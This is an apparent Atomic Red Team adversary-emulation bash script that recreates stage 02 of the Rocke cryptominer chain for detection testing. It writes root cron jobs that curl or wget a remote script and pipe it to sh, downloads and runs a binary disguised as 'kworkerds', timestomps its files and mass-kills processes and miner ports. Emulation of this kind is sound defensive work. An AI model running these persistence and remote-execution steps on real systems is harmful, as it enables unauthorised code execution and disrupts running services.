#! /bin/bash

function c() {
pkill -f sourplum
pkill -f xmrig
pkill -f cryptonight
pkill -f stratum
pkill -f mixnerdx
pkill -f minexmr
pkill -f minerd
pkill -f minergate
pkill -f kworker34
pkill -f Xbash

#   Tactic: Defense Evasion
#   Technique: T1222 - File Permission Modification
chattr -i /tmp/kworkerds /var/tmp/kworkerds

#   Tactic: Defense Evasion
#   Technique: T1107 - File Deletion
rm -rf /tmp/kworkerds /var/tmp/kworkerds

#   Tactic: Discovery
#   Technique: T1057 - Process Discovery
ps auxf|grep -v grep|grep -v "\_" |grep -v "kthreadd" |grep "\[.*\]"|awk '{print $2}'|xargs kill -9 >/dev/null 2>&1
ps auxf|grep -v grep|grep "xmrig" | awk '{print $2}'|xargs kill -9 >/dev/null 2>&1
ps auxf|grep -v grep|grep "Xbash" | awk '{print $2}'|xargs kill -9 >/dev/null 2>&1
ps auxf|grep -v grep|grep "stratum" | awk '{print $2}'|xargs kill -9 >/dev/null 2>&1
ps auxf|grep -v grep|grep "xmr" | awk '{print $2}'|xargs kill -9 >/dev/null 2>&1
ps auxf|grep -v grep|grep "minerd" | awk '{print $2}'|xargs kill -9 >/dev/null 2>&1

#   Tactic: Discovery
#   Technique: T1049 - System Network Connections Discovery
netstat -anp | grep :3333 |awk '{print $7}'| awk -F'[/]' '{print $1}' | xargs kill -9 >/dev/null 2>&1
netstat -anp | grep :4444 |awk '{print $7}'| awk -F'[/]' '{print $1}' | xargs kill -9 >/dev/null 2>&1
netstat -anp | grep :5555 |awk '{print $7}'| awk -F'[/]' '{print $1}' | xargs kill -9 >/dev/null 2>&1
netstat -anp | grep :6666 |awk '{print $7}'| awk -F'[/]' '{print $1}' | xargs kill -9 >/dev/null 2>&1
netstat -anp | grep :7777 |awk '{print $7}'| awk -F'[/]' '{print $1}' | xargs kill -9 >/dev/null 2>&1
netstat -anp | grep :3347 |awk '{print $7}'| awk -F'[/]' '{print $1}' | xargs kill -9 >/dev/null 2>&1
netstat -anp | grep :14444 |awk '{print $7}'| awk -F'[/]' '{print $1}' | xargs kill -9 >/dev/null 2>&1
netstat -anp | grep :14433 |awk '{print $7}'| awk -F'[/]' '{print $1}' | xargs kill -9 >/dev/null 2>&1

echo $(date -u) "Executed Atomic Red Team Rocke and Roll, Stage 02, part C" >> /tmp/atomic.log
}

function b() {
    mkdir -p /var/tmp

    #   Tactic: Defense Evasion
    #   Technique: T1222 - File Permission Modification
    chmod 1777 /var/tmp

    #   Tactic: Defense Evasion
    #   Technique: T1036 - Masquerading
    (curl -fsSL --connect-timeout 120 https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/ARTifacts/Chain_Reactions/atomic-hello -o /var/tmp/kworkerds||wget https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/ARTifacts/Chain_Reactions/atomic-hello -O /var/tmp/kworkerds) && chmod +x /var/tmp/kworkerds
    nohup /var/tmp/kworkerds >/dev/null 2>&1 &

    echo $(date -u) "Executed Atomic Red Team Rocke and Roll, Stage 02, part B" >> /tmp/atomic.log
}

function a() {

    #   Tactic: Defense Evasion
    #   Technique: T1222 - File Permission Modification
	chattr -i /etc/cron.d/root /var/spool/cron/root /var/spool/cron/crontabs/root

    #   Tactic: Persistence
    #   Technique: T1168 - Local Job Scheduling
	echo -e "*/10 * * * * root (curl -fsSL https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/ARTifacts/Chain_Reactions/rocke-and-roll-stage-02-decoded.sh||wget -q -O- https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/ARTifacts/Chain_Reactions/rocke-and-roll-stage-02-decoded.sh)|sh\n##" > /etc/cron.d/root
	mkdir -p /var/spool/cron/crontabs
	echo -e "*/31 * * * * (curl -fsSL https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/ARTifacts/Chain_Reactions/rocke-and-roll-stage-02-decoded.sh||wget -q -O- https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/ARTifacts/Chain_Reactions/rocke-and-roll-stage-02-decoded.sh)|sh\n##" > /var/spool/cron/crontabs/root
	mkdir -p /etc/cron.daily
	(curl -fsSL --connect-timeout 120 https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/ARTifacts/Chain_Reactions/rocke-and-roll-stage-02-decoded.sh -o /etc/cron.daily/oanacroner||wget https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/ARTifacts/Chain_Reactions/rocke-and-roll-stage-02-decoded.sh -O /etc/cron.daily/oanacroner)

    #   Tactic: Defense Evasion
    #   Technique: T1222 - File Permission Modification
    chmod 755 /etc/cron.daily/oanacroner

    #   Tactic: Defense Evasion
    #   Technique: T1099 - Timestomp
	touch -acmr /bin/sh /etc/cron.daily/oanacroner
    touch -acmr /bin/sh /etc/cron.d/root
    touch -acmr /bin/sh /var/spool/cron/crontabs/root

    echo $(date -u) "Executed Atomic Red Team Rocke and Roll, Stage 02, part A" >> /tmp/atomic.log
}

a
b
c